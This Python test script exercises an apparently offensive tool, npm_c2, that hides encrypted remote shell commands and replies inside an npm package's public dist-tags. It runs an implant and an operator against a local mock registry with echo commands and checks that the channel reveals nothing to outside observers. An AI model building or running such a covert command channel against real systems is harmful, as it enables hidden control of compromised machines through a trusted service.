#!/usr/bin/env python3
"""Encrypted channel end-to-end against a real registry.

Boots the in-memory mock, builds nothing, but drives the real Python implant
and operator over HTTP so the sealing path is exercised the way a deployment
uses it. Also asserts that the public tag map leaks nothing.
"""
import base64
import os
import subprocess
import sys
import time
import json
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "src"))
sys.path.insert(0, HERE)

from mock_registry import Registry, serve                          # noqa: E402
import npm_c2                                                      # noqa: E402
from npm_c2 import CMD_PREFIX, RES_PREFIX                          # noqa: E402
from npm_c2.operator import Operator                               # noqa: E402

PKG = "example-pkg"
PASS = "s3al-it-with-a-passphrase"
TOKEN = "npm_faketoken_for_the_test"

fails = []
srv, base = serve(Registry(), auth_token=TOKEN)
port = srv.server_address[1]
npm_c2.API_BASE = base
npm_c2.API = npm_c2.API_BASE + "/-/package/{}/dist-tags"


def run_implant(once=True, seconds=12):
    """Run the package implant in a subprocess for a bounded time."""
    env = dict(os.environ)
    env["NPMC2_API_BASE"] = npm_c2.API_BASE
    env["NPMC2_ONCE"] = "1" if once else "0"
    cmd = [sys.executable, "-m", "npm_c2", "implant", "-p", PKG, "-t", TOKEN,
           "--passphrase", PASS, "--interval", "12", "--jitter", "0"]
    return subprocess.Popen(cmd, env=env, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, text=True,
                            cwd=os.path.join(HERE, ".."))


def public_tags():
    url = f"http://127.0.0.1:{port}/-/package/{PKG}/dist-tags"
    # No Authorization header: this is what any stranger sees.
    with urllib.request.urlopen(url, timeout=10) as r:
        return json.load(r)


# ---------------------------------------------------------------- encrypted
enc = Operator(PKG, TOKEN, passphrase=PASS)
if not enc.push_task("echo hello-encrypted", quiet=True):
    fails.append("encrypted push failed")
else:
    print("[PASS] encrypted command pushed")

# The public map must not contain the plaintext anywhere.
raw = json.dumps(public_tags())
for probe in ("hello-encrypted", "echo hello"):
    if probe in raw:
        fails.append(f"plaintext {probe!r} visible in the public tag map")
    else:
        print(f"[PASS] public map hides {probe!r}")

# A tag chunk decodes to ciphertext, not ASCII.
cmd_tags = [t for t in public_tags() if t.startswith(CMD_PREFIX)]
if not cmd_tags:
    fails.append("no command tags found")
else:
    chunk = cmd_tags[0].split("_", 1)[1]
    data = base64.urlsafe_b64decode(chunk + "=" * (-len(chunk) % 4))
    if b"hello" in data.lower() or all(32 <= b < 127 for b in data[:8]):
        fails.append("tag chunk looks like plaintext")
    else:
        print("[PASS] tag chunk is high-entropy ciphertext")

# Without the passphrase the operator must not read the reply.
plain = Operator(PKG, TOKEN)
tags = plain._fetch()
for _buf, complete in __import__("npm_c2").group_chunks(tags, RES_PREFIX):
    if complete:
        fails.append("unencrypted operator decoded an encrypted reply")
        break
else:
    print("[PASS] unencrypted operator cannot read the channel")

proc = run_implant()
try:
    # Drain the first command's reply so the round-trip result is unambiguous.
    deadline = time.time() + 20
    while time.time() < deadline:
        tags = enc._fetch()
        if any(t.startswith(RES_PREFIX) for t in tags):
            break
        time.sleep(1)
    out = enc.run_command("echo round-trip", timeout=25, interval=2,
                          quiet=True)
finally:
    proc.terminate()
    try:
        proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        proc.kill()

if out is None:
    fails.append("no encrypted round-trip reply")
elif "round-trip" not in out:
    fails.append(f"round-trip reply wrong: {out!r}")
elif "undecryptable" in out:
    fails.append("operator could not decrypt the implant reply")
else:
    print(f"[PASS] encrypted round-trip -> {out.strip()!r}")

print()
if fails:
    for f in fails:
        print("FAIL:", f)
    sys.exit(1)
print("encrypted channel checks passed")
